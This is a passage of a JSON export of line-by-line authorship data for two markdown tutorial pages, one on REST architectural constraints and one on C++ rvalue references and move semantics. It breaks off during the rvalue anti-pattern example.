        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "REST specifies the key designs of the Web. The design of the Web affects greatly how efficient, applicable and modifiable the Web can be. Hence, before understanding the REST principles, we need to understand the requirements of the Web i.e. what the Web is expected to be. "
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "The Web is expected to be a place for convenient storing and sharing of information by its users. Hence, to make the ideal Web, we need to consider the properties of its users and their information. The target audience of the Web are people in different organizations all over the world connected via the Internet. Their organizations would have different requirements for their information (e.g. the authentication for access of information), and the machines they use to access the Web might be very different, with different operating systems and requesting different file formats. These people’s information also has a large variety in terms of the content type and the format. Hence, the Web needs to have the following properties:"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "* the Web should have a simple, uniform interface to present various types of information (e.g. video, audio, graphics, text etc.) "
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "* the Web should be efficient in transmitting information "
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "* the Web should be able to evolve"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "* the Web should not have a central entity to control the whole system, which means there is no control over the amount and the content of information outside the boundary of the organizations using the Web. Hence, 1) the Web elements should be able to cope with unexpected load 2) the Web should be able to communicate authentication data and authorization controls to sieve out the malicious information"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "* the Web should allow its element to undergo incremental changes for evolution "
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "REST is the abstraction of the design that satisfies the above requirements. More details for the above requirements can be found in [Chapter 4.1 WWW Application Domain Requirements](https://www.ics.uci.edu/~fielding/pubs/dissertation/web_arch_domain.htm) in Roy Fielding\u0027s paper about REST. "
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## What Exactly is REST?"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "REST is an architectural style. Fielding defined architectural style as “a coordinated set of architectural constraints that restricts the roles/features of architectural elements and the allowed relationships among those elements within any architecture that conforms to that style”. "
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "After surveying some common architectures for network-based applications on how the architectural constraints induce their corresponding architectural properties, Fielding came up with REST. REST has 6 constraints which aim to induce the properties the Web should have. "
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "### Client-Server"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": "A system in REST style should separate the user interface concern from the data storage concern. As such, the server is freed from managing the user interface and the user interface is detached from the server. This separation of concern allows the server to evolve without impacting the user interface and makes upgrading the server easier. It also enables the system to have a uniform interface regardless of the different structures of data storage at the servers."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "### Stateless"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "A system in REST style should have stateless communications. This means that all the messages must be self-sufficient, containing all the necessary information to understand the message without referring to information outside the message. By making all the messages self-sufficient, the workload of the server is reduced as the server does not have to keep track of the state of application at the clients. The coupling between the server and the client is further reduced by the statelessness of the system, and thus the server can be scaled up and down according to the amount of workload (e.g. the number of requests from the client at certain point of time). Moreover, by eliminating cross referencing to other messages when interpreting one, the chances of error is reduced and reliability of the system enhanced. The statelessness of the system also allows the system to make use of intermediaries as the intermediaries in between the client and the server have all the necessary information to complete their tasks (see [Layered System](#layered-system)).  "
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "### Cache"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "Data within the messages for communications between the server and the client should be indicated if it is cacheable. If cacheable, the caches at the elements along the line of communication (e.g. the client cache, the server cache, the proxy cache etc.) will store the data and reuse it if for identical requests later. The cacheability of information reduces the amount of interactions needed between the client and the server to access information, and thus improves the efficiency of the system. The average latency of interactions is also reduced, which leads to faster response to the client and an improved user-perceived performance."
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "### Layered System"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "Between the client and the server, there should be layers made up by various [intermediaries](https://www.techopedia.com/definition/24378/web-intermediary-wbi) facilitating the processing tasks. Some examples of intermediaries are load-balancer, cache etc. The system elements have no knowledge of the things outside their own layers. For example, a client would not know if it is connected directly to the server or to an intermediary, and an intermediary would not know if it is connected to another intermediary. By limiting the scope of the system element, the complexity of the system is greatly reduced. The system becomes more modifiable as there are less dependencies between the system elements. By facilitating the processing tasks, intermediaries can enhance the server performance by reducing redundant server processing. Moreover, as the intermediaries can carry out a wide range of tasks including [encryption](https://en.wikipedia.org/wiki/Encryption) and request modification and etc.(see \"MEGs\" in [this article](http://www.almaden.ibm.com/cs/wbi/doc/Architecture.html)), the organizations can use intermediaries to enhance their security and their control over information. "
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "### Uniform Interface"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "There should be a way for the server, the client and the intermediaries in the layers in between to communicate with each other. Hence, there should be a uniform interface in the system. The existence of the uniform interface is the foundation for the other 4 architectural constraints. Each component is encapsulated by the interface and hence become more independent of each other, allowing each to evolve independently. By having a uniform interface in the system, interactions between the layers can be monitored as the set of interactions are predefined. By allowing the interactions to be inspected by mediators (e.g., network firewalls), the security of the system is enhanced. However, the existence of the uniform interface might compromise the efficiency of the system as the information is transmitted in a standard format rather than catering to each component’s needs."
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "There are four sub-constraints which further specify the Uniform Interface constraint."
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": " * **Identification of resources**: as mentioned before (see [What does REST mean](#what-does-rest-mean)), *resource* is an organization of information and the identifiers of the resources need to remain constant. An example to illustrate this constraint is [URI](https://en.wikipedia.org/wiki/Uniform_Resource_Identifier). "
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": " * **Manipulation of resources through representations**: as mentioned before (see [What does REST mean](#what-does-rest-mean)), the *representation* of the resource at one point i.e. the representation of the state of the resource, is what the users see and modify, instead of the resource itself. "
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": " * **Self-descriptive messages**: A message in a communication between the web components should contain all the information needed for the web components to understand its content. "
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": " * **Hypermedia as the engine of application state (HATEOAS)**: There should be hyperlinks embedded inside the representations given to the client, such that all the future actions that the client might take are within these representations. Hence, the client can interact with and navigate through the application without any prior knowledge of how to do so. Hence, the client and the server are more independent of each other. "
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "### Code on Demand (Optional)"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "The server can send a code snippet to the client to let the client execute. One example of this is the Javascript code sent along with the webpage in HTML. This constraint extends the client functionality and reduces the workload of the server by reducing the number of features to be implemented at the server. However, it reduces the visibility of the interactions between the client and the server and makes it more difficult to monitor the interactions. Hence, this constraint might be disabled in some implementations in REST style."
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "## Useful Resources"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "* [Roy Fielding\u0027s paper which gave birth to REST](https://www.ics.uci.edu/~fielding/pubs/dissertation/fielding_dissertation.pdf)"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "* [History of hypermedia and REST explained](https://ruben.verborgh.org/phd/hypermedia/)"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "* Web intermediaries"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "  * [Web intermediaries explained](http://www.almaden.ibm.com/cs/wbi/doc/Architecture.html)"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "  * an important type of intermediaries: [proxy](https://en.wikipedia.org/wiki/Proxy_server#Filtering_of_encrypted_data)"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "* Hypermedia as the engine of application state (HATEOAS)"
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "  * [A general wikipedia explanation](https://en.wikipedia.org/wiki/HATEOAS)"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "  * [A more detailed explanation](https://ruben.verborgh.org/phd/hypermedia/#hypermedia-as-the-engine-of-application-state)"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "* Code On Demand"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "  * [a general wikipedia explanation](https://en.wikipedia.org/wiki/Code_on_demand)"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "  * [a stackoverflow explanation](https://stackoverflow.com/questions/32094952/code-demand-constraint-for-restful-apis?utm_medium\u003dorganic\u0026utm_source\u003dgoogle_rich_qa\u0026utm_campaign\u003dgoogle_rich_qa)"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "* [Video explaning REST (easy to get the big picture but not very precise)](https://www.youtube.com/watch?v\u003dYCcAE2SCQ6k)"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 4,
      "-": 98
    }
  },
  {
    "path": "contents/c++/rvalue.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: Rvalue References and Move Semantics"
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# Rvalue References and Move Semantics"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "Authors: [Tan Jun An](https://github.com/yamidark)"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "* [Background](#background)"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Value Semantics](#value-semantics)"
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Reference Semantics](#reference-semantics)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": "* [Move Semantics](#move-semantics)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Rvalue and Lvalue References](#rvalue-and-lvalue-references)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Using Rvalue References](#using-rvalue-references)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "    * [Move Semantics](#move-semantics)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Rvalue Reference Anti-Pattern](#rvalue-reference-anti-pattern)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "-"
        },
        "content": "* [Resources](#resources)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "## Background"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "*C++* is a general-purpose programming language designed to provide high performance and efficiency for resource-constrained and large systems. The language has since been extended and improved upon, with new standards being released periodically. One such standard, the `C++11` standard, improved the performance of the language with features such as **_Rvalue References_** and **_Move Semantics_**."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": "In order to better understand the benefits of using Move Semantics, it is important to first understand the two other modes already available in C++, **_Value Semantics_** and **_References Semantics_**."
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "### Value Semantics"
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Value (or copy) semantics is the programming style where users are only concerned about the values stored in the objects, rather than the object itself. As such, an extra copy of the object will always be created whenever it is passed to a function, (also known as [pass-by-value](https://www.learncpp.com/cpp-tutorial/72-passing-arguments-by-value/)) or when constructing or assigning a new object. This ensures that each object declared (or function) will have their own copied value to use, without having to concern themselves with their originator. By default, C++ uses this mode if variables are declared with only the data type."
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "Some advantages of Value Semantics include:"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "* Lesser memory management issues, as there won\u0027t be any [dangling references](https://www.quora.com/What-is-dangling-reference) to objects that may not exist, nor any [memory leaks](https://www.geeksforgeeks.org/what-is-memory-leak-how-can-we-avoid/)."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "* [Referential transparency](https://en.wikipedia.org/wiki/Referential_transparency). Having our own copy of the object ensures that changing the values inside the copied object will not affect the original object. This is especially useful in a [multi-threaded](https://stackoverflow.com/questions/1313062/what-is-a-multithreaded-application) environment, as it removes the need to synchronise the object\u0027s values, allowing the program to run faster."
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* Better performance. If the function requires accessing of the object\u0027s value many times, having a local copy of the object may be faster than having a pointer to the object and dereferencing it each time. This is especially true in C++ which encourages Value Semantics, with optimization techniques such as [copy elision](https://en.cppreference.com/w/cpp/language/copy_elision) in the compiler which speeds up the process of passing-by-value."
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "However, Value Semantics has [one major flaw](https://www.quora.com/What-are-the-drawbacks-of-pass-by-value-result):"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "* Poor performance and scalability. If the function called is a read-only function, creating an additional copy will be an unnecessary consumption of memory and runtime. This is especially true when scaling up to pass around objects of larger size, as more memory and runtime is needed to create each copy."
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "### Reference Semantics"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Reference (or pointer) semantics is another choice available for use in C++, which allows users to declare [pointers](https://www.cplusplus.com/doc/tutorial/pointers/) and [references](https://www.geeksforgeeks.org/references-in-c/) that point to the address of the object. As such, we can pass these reference address to functions and declaration of other pointers, and all of them will refer to and use the same object and address."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "Some advantages of Reference Semantics include:"
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": "* Improved performance and scalability. By passing around pointers and references to the same object, functions can just use the values in that object directly without having to create an extra copy, thus overcoming the major flaw of Value Semantics."
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "* Interactions between objects and functions. Since the same object can be referred to by different pointers, its value can be modified in different areas of the program."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "However, Reference Semantics also comes with its own problems, such as:"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "* Indeterminant behaviour. In a multi-threaded environment, since each thread will all be pointing to the same object, this will lead to unnecessary [data races](https://docs.oracle.com/cd/E19205-01/820-0619/geojs/index.html) and indeterminant behaviour as they are modified concurrently in each thread. This in turn requires extra work to synchronize the values between objects, which also slows down the program. More details of this can be found in the resources [Java Concurrency](../java/JavaConcurrency.html) and [Java Synchronization](../java/JavaSynchronization.html)."
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "* Harder to debug. If users are not careful, they may modify the values in the object using one pointer, which will then be reflected by another pointer to the same object in a different part of the program, which can confuse users as they may not know where and why the values are changing. A good example of this problem can be found in this [article](https://www.drdobbs.com/cpp/optimization-calling-by-value-or-by-refe/232400151)."
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "## Move Semantics"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "From the summary above, there are many benefits for using Value Semantics. However, its one major flaw is that a copy of the object will always be created, which can be computationally expensive if this object is of a large size. Reference Semantics may also not be preferred due to its different problems as discussed above. As such, in order to continue gaining the benefits Value Semantics have over Reference Semantics while overcoming it\u0027s major flaw, `C++11` introduced a new mode to users, Move Semantics."
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "### Rvalue and Lvalue References"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "To understand how Move Semantics work in C++, it is important to distinguish between an rvalue and an lvalue."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "lvalue \u003d rvalue"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "From the line above, lvalue (left value) basically refers to values that are addressable, while rvalue (right value) are temporary objects or values which are used only on the right side of an assignment expression. More details and classification of these 2 values can be found [here](https://www.bogotobogo.com/cplusplus/C11/4_C11_Rvalue_Lvalue.php)."
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": "### Using Rvalue References"
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "Rvalue References allows us to distinguish an lvalue from an rvalue. In `C++11`, we can declare an Rvalue Reference using the `\u0026\u0026` operator:"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "```cpp"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "int \u0026\u0026rvalue \u003d 55;"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "We can also convert an lvalue to a rvalue using the `std::move` function:"
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "```cpp"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "int lvalue \u003d 99;"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "int \u0026\u0026rvalue2 \u003d std::move(lvalue);"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "We can also do [function overloading](https://en.wikibooks.org/wiki/Computer_Programming/Function_overloading)"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "in order to determine whether the parameters given are lvalues or rvalues:"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "```cpp"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "void print(int\u0026 lvalue) { // takes an lvalue"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "    std::cout \u003c\u003c \"lvalue method used\";"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "void print(int\u0026\u0026 rvalue) { // takes a rvalue"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "    std::cout \u003c\u003c \"rvalue method used\";"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": "int main() {"
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "    int x \u003d 5;"
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": "    print(x); // lvalue method used"
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "    print(10); // rvalue method used."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "Usage of function overloading with Rvalue Reference parameters, which take on temporary objects, helps in writing more efficient programs using Move Semantics!"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "### Move Semantics"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "The main usage of Rvalue References is that it allows us to create *move* constructor and *move* assignments, instead of *copy* constructor and *copy* assignments by default. Since rvalues are typically temporary objects, we can just *move* the value instead of *copying* it, thus reducing  memory consumption and improving performance!"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "One example implementation of a move constructor and move assignment is shown below:"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "```cpp"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "Foo(Foo\u0026\u0026 other) { // move constructor"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "    x \u003d other.x;"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "    y \u003d other.y;"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "    z \u003d other.z;"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "Foo\u0026 operator\u003d(Foo\u0026\u0026 other) { // move assignment"
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": "    x \u003d std::move(other.x);"
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "    y \u003d std::move(other.y);"
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": "    z \u003d std::move(other.z);"
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "    return *this;"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "In this move constructor and assignment, the contents of the `other` parameter is *moved* into the object, and the contents in `other` is destroyed afterwards. No additional memory allocation is required, and the *move* operation is done quickly by a few assignment of address operations, leading to a faster and more memory efficient program."
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "Along with Move Semantics in `C++11`, the [STL library](https://www.geeksforgeeks.org/the-c-standard-template-library-stl/) provides the overloaded *move* functions for its container classes (e.g. `vector`, `list`, `set`), thus we can take advantage of these Move Semantics by simply supplying rvalues, without the need to redefine the classes ourselves."
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "## Rvalue Reference Anti-Pattern"
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": "After learning about the new Rvalue References and Move Semantics in `C++11`, many programmers from the older C++ eras may fall into a trap of the Rvalue Reference [Anti-Pattern](https://en.wikipedia.org/wiki/Anti-pattern)."
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": "Consider these 2 class constructors:"
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "```cpp"
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": "Foo(const std::string\u0026 x, const std::string\u0026 y) { // copy constructor"
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "    _x \u003d x;"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "    _y \u003d y;"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "Foo(std::string\u0026\u0026 x, std::string\u0026\u0026 y) { // move constructor"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "    _x \u003d x;"
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "    _y \u003d y;"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
